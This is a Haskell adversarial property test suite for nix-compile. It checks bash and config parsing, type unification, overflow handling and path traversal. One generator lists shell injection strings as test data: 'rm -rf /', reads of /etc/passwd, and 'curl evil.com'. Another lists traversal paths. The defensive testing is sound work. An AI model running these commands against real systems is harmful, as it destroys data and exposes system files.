{-# LANGUAGE LambdaCase #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# LANGUAGE TypeApplications #-}

-- |
-- Module      : Adversarial
-- Description : Adversarial property tests for nix-compile
--
-- This test suite is designed to BREAK things. It generates:
--   - Malformed input that should not crash
--   - Edge cases that expose specification violations
--   - Injection attempts that must be blocked
--   - Algebraic property violations
--
-- Run with:
--   cabal test adversarial -- --quickcheck-tests=10000
{-# OPTIONS_GHC -Wno-orphans #-}
{-# OPTIONS_GHC -Wno-missing-export-lists #-}
module Adversarial where

import Control.Exception (SomeException, evaluate, try)
import Control.Monad (forM, replicateM)
import qualified Data.ByteString as BS
import Data.Either (isRight, isLeft)
import Data.Int (Int64)
import qualified Data.Map.Strict as Map
import Data.Maybe (isJust)
import Data.Text (Text)
import qualified Data.Text as T
import System.Exit (exitFailure, exitSuccess)
import System.IO.Unsafe (unsafePerformIO)
import System.Timeout (timeout)
import Test.QuickCheck
import Test.QuickCheck.Monadic (monadicIO, run, assert)
-- import Text.Read (readMaybe)

-- Import the modules under test
import NixCompile
import NixCompile.Bash.Facts (extractFacts)
import NixCompile.Bash.Parse (parseBash)
import NixCompile.Bash.Patterns
import NixCompile.Emit.Config (emitConfigFunction)
import NixCompile.Infer.Constraint (factsToConstraints)
import NixCompile.Infer.Unify (unify, solve)
import NixCompile.Schema.Build (buildSchema)
import NixCompile.Pretty (toText)
-- import NixCompile.Types hiding (TypeVar)
-- import qualified NixCompile.Types as T

-- ============================================================================
-- GENERATORS: Adversarial Input Generation
-- ============================================================================

-- | Generate valid variable names (conforming to POSIX)
genValidVarName :: Gen Text
genValidVarName = do
  c <- elements $ ['A'..'Z'] ++ ['a'..'z'] ++ ['_']
  rest <- listOf $ elements $ ['A'..'Z'] ++ ['a'..'z'] ++ ['0'..'9'] ++ ['_']
  let name = c : take 20 rest
  return $ T.pack name

-- | Generate INVALID variable names (for negative testing)
genInvalidVarName :: Gen Text
genInvalidVarName = oneof
  [ pure ""                                    -- Empty
  , T.pack . (:[]) <$> elements ['0'..'9']    -- Starts with digit
  , T.cons <$> elements "-+*/" <*> genValidVarName  -- Starts with operator
  , do v <- genValidVarName; pure (v <> "$")  -- Contains $
  , do v <- genValidVarName; pure (v <> "`")  -- Contains backtick
  , do v <- genValidVarName; pure (v <> " ")  -- Contains space
  , pure ";"                                   -- Shell metachar
  , pure "|"
  , pure "&"
  ]

-- | Generate shell injection attempts
genInjectionAttempt :: Gen Text
genInjectionAttempt = elements
  [ "; rm -rf /"
  , "$(whoami)"
  , "`id`"
  , "| cat /etc/passwd"
  , "&& curl evil.com"
  , "\"; echo pwned; \""
  , "'; echo pwned; '"
  , "$'\\x00'"
  , "${IFS}cat${IFS}/etc/passwd"
  , "$(</etc/passwd)"
  , "\n; id\n"
  , "\\`id\\`"
  , "\\$(whoami)"
  ]

-- | Generate integers that might overflow
genOverflowInt :: Gen Text
genOverflowInt = oneof
  [ pure "9223372036854775808"   -- 2^63 (overflows Int64)
  , pure "-9223372036854775809"  -- -2^63 - 1
  , pure "99999999999999999999999999999999999999"  -- Way too big
  , pure "0000000000000000000000000000000000001"  -- Leading zeros
  , T.pack . show <$> (arbitrary :: Gen Int64)  -- Valid Int64
  ]

-- | Generate malformed parameter expansions
genMalformedExpansion :: Gen Text
genMalformedExpansion = oneof
  [ pure "${"                     -- Unclosed
  , pure "${}"                    -- Empty
  , pure "${VAR:-"               -- Unclosed with default
  , pure "${VAR"                 -- No closing brace
  , pure "${{{"                  -- Multiple braces
  , pure "${VAR:-${NESTED}}"     -- Nested (valid but complex)
  , pure "${VAR:-${NESTED:-x}}"  -- Double nested
  , pure "${VAR:--}"             -- Double dash
  , pure "${VAR::}"              -- Double colon
  , pure "${VAR:}"               -- Colon only
  , pure "${:VAR}"               -- Colon prefix
  , pure "${-VAR}"               -- Operator as first char
  , do n <- genValidVarName; pure ("${" <> n <> ":-$" <> n <> "}")  -- Self-reference
  ]

-- | Generate valid parameter expansions
genValidExpansion :: Gen Text
genValidExpansion = do
  var <- genValidVarName
  op <- elements
    [ ":-default"
    , "-default"
    , ":=default"
    , "=default"
    , ":?error"
    , "?error"
    , ":+alt"
    , "+alt"
    , ":-"
    , "-"
    , ""
    ]
  pure $ "${" <> var <> op <> "}"

-- | Generate config paths
genConfigPath :: Gen [Text]
genConfigPath = do
  len <- choose (1, 5)
  replicateM len $ do
    c <- elements $ ['a'..'z'] ++ ['A'..'Z']
    rest <- listOf $ elements $ ['a'..'z'] ++ ['A'..'Z'] ++ ['0'..'9'] ++ ['_']
    pure $ T.pack (c : take 10 rest)

-- | Generate malformed config assignments
genMalformedConfig :: Gen Text
genMalformedConfig = oneof
  [ pure "config.="               -- Empty value
  , pure "config..a=1"            -- Empty segment
  , pure "config.a.=1"            -- Trailing dot
  , pure "config[]=1"             -- Empty key
  , pure "config[a.]=1"           -- Trailing dot in key
  , pure "config[.a]=1"           -- Leading dot in key
  , pure "config="                -- No path
  , pure "config"                 -- Nothing
  , pure "config.a.b"             -- No assignment
  , pure "config.a.b=$"           -- Incomplete var
  , pure "config.a.b=${"          -- Unclosed var
  ]

-- | Generate arbitrary bytes (for fuzzing)
genArbitraryBytes :: Gen BS.ByteString
genArbitraryBytes = BS.pack <$> listOf arbitrary

-- | Generate arbitrary text that might not be valid UTF-8
genArbitraryText :: Gen Text
genArbitraryText = oneof
  [ T.pack <$> listOf (elements $ ['\0'..'\127'])  -- ASCII
  , T.pack <$> listOf arbitrary                     -- Any Char
  , genValidVarName                                 -- Known good
  ]

-- | Generate a Literal
genLiteral :: Gen Literal
genLiteral = oneof
  [ LitInt <$> arbitrary
  , LitString <$> genArbitraryText
  , LitBool <$> arbitrary
  , LitPath . StorePath <$> genStorePath
  ]

-- | Generate store paths
genStorePath :: Gen Text
genStorePath = do
  hash <- replicateM 32 (elements $ ['a'..'z'] ++ ['0'..'9'])
  name <- genValidVarName
  pure $ "/nix/store/" <> T.pack hash <> "-" <> name

-- | Generate store paths with traversal attempts
genTraversalPath :: Gen Text
genTraversalPath = oneof
  [ pure "/nix/store/../../../etc/passwd"
  , pure "/nix/store/abc/../../../bin/sh"
  , do p <- genStorePath; pure (p <> "/../../../etc/passwd")
  , pure "/nix/store/./abc"
  , pure "/nix/store//abc"
  ]

-- | Generate a Type
genType :: Gen Type
genType = elements [TInt, TString, TBool, TPath]

-- | Generate a TypeVar
genTypeVar :: Gen TypeVar
genTypeVar = TypeVar <$> genValidVarName

-- | Generate a Type with variables
genTypeWithVars :: Gen Type
genTypeWithVars = frequency
  [ (4, genType)
  , (1, TVar <$> genTypeVar)
  ]

-- | Generate a Span
genSpan :: Gen Span
genSpan = do
  l1 <- choose (1, 10000)
  c1 <- choose (0, 200)
  l2 <- choose (l1, l1 + 100)
  c2 <- choose (0, 200)
  pure $ Span (Loc l1 c1) (Loc l2 c2) Nothing

-- | Generate a Constraint
genConstraint :: Gen Constraint
genConstraint = (:~:) <$> genTypeWithVars <*> genTypeWithVars

-- | Generate satisfiable constraints
genSatisfiableConstraints :: Gen [Constraint]
genSatisfiableConstraints = oneof
  [ -- Reflexive: T ~ T
    do ts <- listOf genType
       pure $ map (\t -> t :~: t) ts
  , -- Variable bindings: X ~ T
    do n <- choose (1, 5)
       vs <- replicateM n genTypeVar
       ts <- replicateM n genType
       pure $ zipWith (\v t -> TVar v :~: t) vs ts
  , -- Chain: X ~ Y ~ T
    do v1 <- genTypeVar
       v2 <- genTypeVar
       t <- genType
       pure [TVar v1 :~: TVar v2, TVar v2 :~: t]
  ]

-- | Generate unsatisfiable constraints
genUnsatisfiableConstraints :: Gen [Constraint]
genUnsatisfiableConstraints = oneof
  [ -- Concrete mismatch: TInt ~ TString
    pure [TInt :~: TString]
  , pure [TBool :~: TPath]
  , pure [TString :~: TInt]
  , -- Transitively unsatisfiable: X ~ TInt, X ~ TString
    do v <- genTypeVar
       pure [TVar v :~: TInt, TVar v :~: TString]
  ]

-- | Generate a Fact
genFact :: Gen Fact
genFact = oneof
  [ DefaultIs <$> genValidVarName <*> genLiteral <*> genSpan
  , DefaultFrom <$> genValidVarName <*> genValidVarName <*> genSpan
  , Required <$> genValidVarName <*> genSpan
  , AssignFrom <$> genValidVarName <*> genValidVarName <*> genSpan
  , AssignLit <$> genValidVarName <*> genLiteral <*> genSpan
  , ConfigAssign <$> genConfigPath <*> genValidVarName <*> elements [Quoted, Unquoted] <*> genSpan
  , ConfigLit <$> genConfigPath <*> genLiteral <*> genSpan
  , BareCommand <$> genArbitraryText <*> genSpan
  , DynamicCommand <$> genValidVarName <*> genSpan
  , UsesStorePath <$> (StorePath <$> genStorePath) <*> genSpan
  , CmdArg <$> genArbitraryText <*> genArbitraryText <*> genValidVarName <*> genSpan
  ]

-- | Generate valid bash script fragments
genBashScript :: Gen Text
genBashScript = do
  ls <- listOf1 genBashLine
  pure $ T.unlines ls

genBashLine :: Gen Text
genBashLine = frequency
  [ (3, genAssignment)
  , (2, genConfigLine)
  , (1, genCommand)
  , (1, pure "")
  , (1, ("#" <>) <$> genArbitraryText)
  ]

genAssignment :: Gen Text
genAssignment = do
  var <- genValidVarName
  val <- oneof
    [ genValidExpansion
    , ("\"" <>) . (<> "\"") <$> genArbitraryText
    , T.pack . show <$> (arbitrary :: Gen Int)
    , elements ["true", "false"]
    ]
  pure $ var <> "=" <> val

genConfigLine :: Gen Text
genConfigLine = do
  path <- genConfigPath
  var <- genValidVarName
  quoted <- arbitrary
  let pathText = "config." <> T.intercalate "." path
  let val = if quoted then "\"$" <> var <> "\"" else "$" <> var
  pure $ pathText <> "=" <> val

genCommand :: Gen Text
genCommand = oneof
  [ do path <- genStorePath; pure (path <> "/bin/cmd arg1 arg2")
  , do cmd <- elements ["echo", "printf", "test"]; pure (cmd <> " hello")
  ]

-- ============================================================================
-- ARBITRARY INSTANCES
-- ============================================================================

instance Arbitrary Text where
  arbitrary = genArbitraryText
  shrink t = map T.pack $ shrink (T.unpack t)

instance Arbitrary Type where
  arbitrary = genTypeWithVars
  shrink = const []

instance Arbitrary TypeVar where
  arbitrary = genTypeVar

instance Arbitrary Literal where
  arbitrary = genLiteral

instance Arbitrary Span where
  arbitrary = genSpan

instance Arbitrary Quoted where
  arbitrary = elements [Quoted, Unquoted]

instance Arbitrary Fact where
  arbitrary = genFact

instance Arbitrary Constraint where
  arbitrary = genConstraint

instance Arbitrary ConfigSpec where
  arbitrary = ConfigSpec
    <$> genType
    <*> oneof [Just <$> genValidVarName, pure Nothing]
    <*> oneof [Just <$> arbitrary, pure Nothing]
    <*> oneof [Just <$> genLiteral, pure Nothing]
    <*> genSpan

-- ============================================================================
-- ALGEBRAIC PROPERTIES
-- ============================================================================

-- | PROP-1: Unification is reflexive
prop_unify_reflexive :: Type -> Bool
prop_unify_reflexive t = isRight (unify t t)

-- | PROP-2: Unification is symmetric
prop_unify_symmetric :: Type -> Type -> Bool
prop_unify_symmetric t1 t2 =
  isRight (unify t1 t2) == isRight (unify t2 t1)

-- | PROP-3: Empty substitution is identity
prop_subst_identity :: Type -> Bool
prop_subst_identity t = applySubst emptySubst t == t

-- | PROP-4: Substitution composition is associative
prop_subst_compose :: [(TypeVar, Type)] -> [(TypeVar, Type)] -> Type -> Bool
prop_subst_compose pairs1 pairs2 t =
  let s1 = Map.fromList pairs1
      s2 = Map.fromList pairs2
  in applySubst s1 (applySubst s2 t) == applySubst (composeSubst s1 s2) t

-- | PROP-5: Solving satisfiable constraints succeeds
prop_solve_satisfiable :: Property
prop_solve_satisfiable = forAll genSatisfiableConstraints $ \cs ->
  isRight (solve cs)

-- | PROP-5b: Solved constraints are satisfied
prop_solve_satisfies :: Property
prop_solve_satisfies = forAll genSatisfiableConstraints $ \cs ->
  case solve cs of
    Left _ -> True  -- Didn't solve, OK
    Right s -> all (satisfied s) cs
  where
    satisfied s (t1 :~: t2) =
      let t1' = applySubst s t1
          t2' = applySubst s t2
      in t1' == t2'

-- | PROP-6: Unsatisfiable constraints fail to solve
prop_solve_unsatisfiable :: Property
prop_solve_unsatisfiable = forAll genUnsatisfiableConstraints $ \cs ->
  isLeft (solve cs)

-- | PROP-7: Constraint generation is deterministic
prop_constraints_deterministic :: [Fact] -> Bool
prop_constraints_deterministic facts =
  factsToConstraints facts == factsToConstraints facts

-- | PROP-8: Schema building is deterministic
prop_schema_deterministic :: [Fact] -> Bool
prop_schema_deterministic facts =
  let s = emptySubst
  in buildSchema facts s == buildSchema facts s

-- ============================================================================
-- PARSER SAFETY PROPERTIES
-- ============================================================================

-- | PROP-9: parseLiteral never crashes on any input
prop_literal_no_crash :: Text -> Bool
prop_literal_no_crash t =
  let result = parseLiteral t
  in result `seq` True

-- | PROP-9b: parseLiteral on overflow doesn't throw
prop_literal_overflow_safe :: Property
prop_literal_overflow_safe = forAll genOverflowInt $ \t ->
  let result = parseLiteral t
  in result `seq` True

-- | PROP-10: parseParamExpansion never crashes
prop_expansion_no_crash :: Text -> Bool
prop_expansion_no_crash t =
  let result = parseParamExpansion t
  in result `seq` True

-- | PROP-10b: Malformed expansions don't crash
prop_expansion_malformed_safe :: Property
prop_expansion_malformed_safe = forAll genMalformedExpansion $ \t ->
  let result = parseParamExpansion t
  in result `seq` True

-- | PROP-11: parseConfigAssignment never crashes
prop_config_no_crash :: Text -> Bool
prop_config_no_crash t =
  let result = parseConfigAssignment t
  in result `seq` True

-- | PROP-11b: Malformed configs don't crash
prop_config_malformed_safe :: Property
prop_config_malformed_safe = forAll genMalformedConfig $ \t ->
  let result = parseConfigAssignment t
  in result `seq` True

-- | PROP-12: parseBash never crashes on valid UTF-8
prop_bash_no_crash :: Text -> Property
prop_bash_no_crash t = monadicIO $ do
  result <- run $ try @SomeException $ evaluate $ parseBash t
  assert $ case result of
    Left _ -> True   -- Exception is a bug, but don't crash the test
    Right _ -> True

-- ============================================================================
-- SPECIFICATION CONFORMANCE
-- ============================================================================

-- | Test vector: parameter expansion parsing
prop_expansion_test_vectors :: Property
prop_expansion_test_vectors = conjoin
  [ parseParamExpansion "${VAR:-default}" === Just (DefaultValue "VAR" (Just "default"))
  , parseParamExpansion "${VAR-default}" === Just (DefaultValue "VAR" (Just "default"))
  , parseParamExpansion "${VAR:-}" === Just (DefaultValue "VAR" (Just ""))
  , parseParamExpansion "${VAR-}" === Just (DefaultValue "VAR" (Just ""))
  , parseParamExpansion "${VAR:?}" === Just (ErrorIfUnset "VAR" Nothing)
  , parseParamExpansion "${VAR:?msg}" === Just (ErrorIfUnset "VAR" (Just "msg"))
  , parseParamExpansion "${VAR}" === Just (SimpleRef "VAR")
  , parseParamExpansion "$VAR" === Just (SimpleRef "VAR")
  , parseParamExpansion "${VAR:+alt}" === Just (UseAlternate "VAR" (Just "alt"))
  , parseParamExpansion "${VAR+alt}" === Just (UseAlternate "VAR" (Just "alt"))
  , parseParamExpansion "${X-}" === Just (DefaultValue "X" (Just ""))
  , parseParamExpansion "${_A1-x}" === Just (DefaultValue "_A1" (Just "x"))
  ]

-- | Test vector: literal parsing
prop_literal_test_vectors :: Property
prop_literal_test_vectors = conjoin
  [ parseLiteral "true" === LitBool True
  , parseLiteral "false" === LitBool False
  , parseLiteral "0" === LitInt 0
  , parseLiteral "-1" === LitInt (-1)
  , parseLiteral "42" === LitInt 42
  , parseLiteral "-" === LitString "-"
  , parseLiteral "--1" === LitString "--1"
  , parseLiteral "1-1" === LitString "1-1"
  , parseLiteral "" === LitString ""
  ]

-- | CRITICAL: Empty default is NOT required
prop_empty_default_not_required :: Property
prop_empty_default_not_required = 
  parseParamExpansion "${VAR:-}" =/= Just (ErrorIfUnset "VAR" Nothing)
  .&&. parseParamExpansion "${VAR:-}" === Just (DefaultValue "VAR" (Just ""))

-- | CRITICAL: Store paths with traversal are rejected
prop_traversal_rejected :: Property
prop_traversal_rejected = forAll genTraversalPath $ \path ->
  not (isStorePath path) .||. not (".." `T.isInfixOf` path)

-- | Test that integers outside Int64 range become strings
prop_overflow_becomes_string :: Property
prop_overflow_becomes_string = conjoin
  [ case parseLiteral "9223372036854775808" of
      LitString _ -> True
      _ -> False
  , case parseLiteral "-9223372036854775809" of
      LitString _ -> True
      _ -> False
  ]

-- ============================================================================
-- SECURITY PROPERTIES
-- ============================================================================

-- | SEC-1: Variable names must be valid
prop_varname_valid :: Property
prop_varname_valid = forAll genValidVarName $ \name ->
  T.all isValidVarChar name
  where
    isValidVarChar c = c `elem` ['A'..'Z'] || c `elem` ['a'..'z'] 
                    || c `elem` ['0'..'9'] || c == '_'

-- | SEC-2: Invalid variable names rejected in config
prop_invalid_varname_rejected :: Property
prop_invalid_varname_rejected = forAll genInvalidVarName $ \name ->
  let config = "config.test=\"$" <> name <> "\""
  in case parseConfigAssignment config of
       Nothing -> True
       Just ca -> T.all isValidVarChar (either id (const "") (configValue ca))
  where
    isValidVarChar c = c `elem` ['A'..'Z'] || c `elem` ['a'..'z'] 
                    || c `elem` ['0'..'9'] || c == '_'

-- | SEC-3: Injection attempts in variable names don't execute
prop_injection_blocked :: Property
prop_injection_blocked = forAll genInjectionAttempt $ \injection ->
  let -- Try to inject via variable name
      config = "config.test=$" <> injection
  in case parseConfigAssignment config of
       Nothing -> True  -- Rejected, good
       Just ca -> 
         -- If parsed, the injection should be in the literal, not extracted as code
         case configValue ca of
           Left var -> not (any (`T.isInfixOf` var) [";", "|", "&", "`", "$("])
           Right _ -> True

-- | SEC-4: Path traversal blocked in store path detection
prop_store_path_no_traversal :: Property
prop_store_path_no_traversal = forAll genTraversalPath $ \path ->
  ".." `T.isInfixOf` path ==> not (isStorePath path)

-- ============================================================================
-- EMIT-CONFIG PROPERTIES
-- ============================================================================

-- | emitConfigFunction produces valid bash (no heredocs)
prop_emit_no_heredoc :: [Fact] -> Bool
prop_emit_no_heredoc facts =
  let schema = buildSchema facts emptySubst
      output = toText (emitConfigFunction schema)
  in not ("<<" `T.isInfixOf` output)

-- | emitConfigFunction output contains no unescaped special chars in literals
prop_emit_escaped :: Property
prop_emit_escaped = forAll genLiteral $ \lit ->
  let spec = ConfigSpec TString Nothing Nothing (Just lit) (Span (Loc 1 0) (Loc 1 0) Nothing)
      schema = emptySchema { schemaConfig = Map.singleton ["test"] spec }
      output = toText (emitConfigFunction schema)
  in case lit of
       LitString s -> 
         -- If string contains special chars, they should be escaped
         not (T.any (\c -> c `elem` ['"', '\\', '\n', '\r', '\t']) s)
         || "\\\"" `T.isInfixOf` output || "\\n" `T.isInfixOf` output
       _ -> True

-- ============================================================================
-- STRESS TESTS
-- ============================================================================

-- | Large script doesn't crash
prop_stress_large_script :: Property
prop_stress_large_script = forAll (resize 100 genBashScript) $ \script ->
  case parseBash script of
    Left _ -> True
    Right ast ->
      let facts = extractFacts ast
          constraints = factsToConstraints facts
      in case solve constraints of
           Left _ -> True
           Right s -> buildSchema facts s `seq` True

-- | Many variables don't explode
prop_stress_many_vars :: Property
prop_stress_many_vars = 
  let script = T.unlines [ "VAR" <> T.pack (show i) <> "=\"${VAR" <> T.pack (show i) <> ":-default}\""
                         | i <- [1..100] :: [Int] ]
  in case parseScript script of
       Left _ -> property True
       Right s -> property $ Map.size (schemaEnv (scriptSchema s)) >= 100

-- | Deep config paths work
prop_stress_deep_config :: Property
prop_stress_deep_config =
  let path = T.intercalate "." (replicate 20 "level")
      script = "config." <> path <> "=$VAR"
  in case parseBash script of
       Left _ -> property True
       Right ast ->
         let facts = extractFacts ast
         in property $ any isConfigFact facts
  where
    isConfigFact (ConfigAssign _ _ _ _) = True
    isConfigFact (ConfigLit _ _ _) = True
    isConfigFact _ = False

-- | Chained variable references resolve
prop_stress_chain :: Property
prop_stress_chain =
  let n = 20
      vars = ["VAR" <> T.pack (show i) | i <- [1..n] :: [Int]]
  in case vars of
       [] -> property True
       (v1:rest) ->
         let assigns = zipWith (\v prev -> v <> "=\"$" <> prev <> "\"") rest vars
             firstAssign = v1 <> "=\"${" <> v1 <> ":-42}\""
             script = T.unlines (firstAssign : assigns)
         in case parseBash script of
              Left _ -> property False
              Right ast ->
                let facts = extractFacts ast
                in property $ length facts >= n

-- ============================================================================
-- BOUNDED RESOURCE TESTS
-- ============================================================================

-- | Parsing completes in bounded time (1 second)
prop_bounded_time :: Property
prop_bounded_time = forAll (resize 50 genBashScript) $ \script ->
  unsafePerformIO $ do
    result <- timeout 1000000 $ evaluate $ parseBash script
    return $ isJust result

-- | Parsing uses bounded memory (best effort - checks for obvious blow-ups)
prop_no_memory_bomb :: Property
prop_no_memory_bomb = forAll genMalformedExpansion $ \expansion ->
  -- Repetitive input that could cause exponential blowup
  let bomb = T.replicate 100 expansion
  in parseBash bomb `seq` True

-- ============================================================================
-- ROUNDTRIP PROPERTIES
-- ============================================================================

-- | Literal type is preserved through parsing
prop_literal_type_preserved :: Literal -> Bool
prop_literal_type_preserved lit =
  literalType lit == literalType (parseLiteral (renderLiteral lit))
  where
    renderLiteral (LitInt n) = T.pack (show n)
    renderLiteral (LitBool True) = "true"
    renderLiteral (LitBool False) = "false"
    renderLiteral (LitString s) = s
    renderLiteral (LitPath (StorePath p)) = p

-- ============================================================================
-- MAIN TEST RUNNER
-- ============================================================================

main :: IO ()
main = do
  putStrLn "╔══════════════════════════════════════════════════════════════════╗"
  putStrLn "║           ADVERSARIAL PROPERTY TEST SUITE                        ║"
  putStrLn "║           nix-compile specification conformance                  ║"
  putStrLn "╚══════════════════════════════════════════════════════════════════╝"
  putStrLn ""

  results <- sequence
    [ section "ALGEBRAIC PROPERTIES"
        [ ("unify_reflexive", property prop_unify_reflexive)
        , ("unify_symmetric", property prop_unify_symmetric)
        , ("subst_identity", property prop_subst_identity)
        , ("subst_compose", property prop_subst_compose)
        , ("solve_satisfiable", property prop_solve_satisfiable)
        , ("solve_satisfies", property prop_solve_satisfies)
        , ("solve_unsatisfiable", property prop_solve_unsatisfiable)
        , ("constraints_deterministic", property prop_constraints_deterministic)
        , ("schema_deterministic", property prop_schema_deterministic)
        ]

    , section "PARSER SAFETY"
        [ ("literal_no_crash", property prop_literal_no_crash)
        , ("literal_overflow_safe", property prop_literal_overflow_safe)
        , ("expansion_no_crash", property prop_expansion_no_crash)
        , ("expansion_malformed_safe", property prop_expansion_malformed_safe)
        , ("config_no_crash", property prop_config_no_crash)
        , ("config_malformed_safe", property prop_config_malformed_safe)
        , ("bash_no_crash", property prop_bash_no_crash)
        ]

    , section "SPECIFICATION CONFORMANCE"
        [ ("expansion_test_vectors", property prop_expansion_test_vectors)
        , ("literal_test_vectors", property prop_literal_test_vectors)
        , ("empty_default_not_required", property prop_empty_default_not_required)
        , ("traversal_rejected", property prop_traversal_rejected)
        , ("overflow_becomes_string", property prop_overflow_becomes_string)
        ]

    , section "SECURITY"
        [ ("varname_valid", property prop_varname_valid)
        , ("invalid_varname_rejected", property prop_invalid_varname_rejected)
        , ("injection_blocked", property prop_injection_blocked)
        , ("store_path_no_traversal", property prop_store_path_no_traversal)
        ]

    , section "EMIT-CONFIG"
        [ ("emit_no_heredoc", property prop_emit_no_heredoc)
        , ("emit_escaped", property prop_emit_escaped)
        ]

    , section "STRESS TESTS"
        [ ("stress_large_script", property prop_stress_large_script)
        , ("stress_many_vars", property prop_stress_many_vars)
        , ("stress_deep_config", property prop_stress_deep_config)
        , ("stress_chain", property prop_stress_chain)
        ]

    , section "RESOURCE BOUNDS"
        [ ("bounded_time", property prop_bounded_time)
        , ("no_memory_bomb", property prop_no_memory_bomb)
        ]

    , section "ROUNDTRIP"
        [ ("literal_type_preserved", property prop_literal_type_preserved)
        ]
    ]

  let allResults = concat results
  let passed = length (filter id allResults)
  let totalTests = length allResults

  putStrLn ""
  putStrLn "══════════════════════════════════════════════════════════════════"
  putStrLn $ "  RESULTS: " ++ show passed ++ "/" ++ show totalTests ++ " passed"
  putStrLn "══════════════════════════════════════════════════════════════════"

  if all id allResults
    then do
      putStrLn "  ✓ ALL TESTS PASSED"
      exitSuccess
    else do
      putStrLn "  ✗ SOME TESTS FAILED"
      exitFailure

section :: String -> [(String, Property)] -> IO [Bool]
section name props = do
  putStrLn $ "┌─ " ++ name ++ " " ++ replicate (60 - length name) '─'
  results <- forM props $ \(propName, prop) -> do
    putStr $ "│  " ++ propName ++ " "
    putStr $ replicate (40 - length propName) '.'
    putStr " "
    result <- quickCheckResult (withMaxSuccess 500 prop)
    case result of
      Success {} -> do
        putStrLn "✓"
        return True
      _ -> do
        putStrLn "✗"
        return False
  putStrLn "└" 
  putStrLn ""
  return results
